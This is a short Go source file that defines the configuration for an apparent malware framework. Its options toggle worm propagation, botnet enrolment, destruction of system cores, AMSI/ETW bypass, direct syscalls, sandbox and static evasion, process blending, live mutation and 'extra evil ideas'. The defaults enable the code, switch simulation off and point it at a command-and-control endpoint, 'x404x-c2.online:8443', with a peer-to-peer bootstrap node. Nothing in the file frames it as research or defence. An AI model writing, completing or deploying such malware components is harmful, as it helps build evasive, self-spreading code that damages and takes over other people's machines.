package v210

type V210Config struct {
	Enabled                     bool   `json:"enabled"`
	Simulation                  bool   `json:"simulation"`
	ApocalipsisEnable           bool   `json:"apocalipsis_enable"`
	PhantomEvasionEnable        bool   `json:"phantom_evasion_enable"`
	CoreDestroy                 bool   `json:"core_destroy"`
	WormPropagate               bool   `json:"worm_propagate"`
	BotnetJoin                  bool   `json:"botnet_join"`
	CryptoLayerEnable           bool   `json:"crypto_layer_enable"`
	StaticEvasion               bool   `json:"static_evasion"`
	AMSIETWBypass               bool   `json:"amsi_etw_bypass"`
	DirectSyscalls              bool   `json:"direct_syscalls"`
	SandboxEvasion              bool   `json:"sandbox_evasion"`
	ProcessBlending             bool   `json:"process_blending"`
	LiveMutation                bool   `json:"live_mutation"`
	ExtraEvilIdeas              bool   `json:"extra_evil_ideas"`
	C2Endpoint                  string `json:"c2_endpoint"`
	P2PBootstrapNode            string `json:"p2p_bootstrap_node"`
	DHTNetworkID                string `json:"dht_network_id"`
}

func DefaultV210Config() *V210Config {
	return &V210Config{
		Enabled: true, Simulation: false,
		C2Endpoint: "x404x-c2.online:8443",
		P2PBootstrapNode: "/ip4/127.0.0.1/tcp/4001",
		DHTNetworkID: "x404x-apocalipsis-mainnet",
	}
}
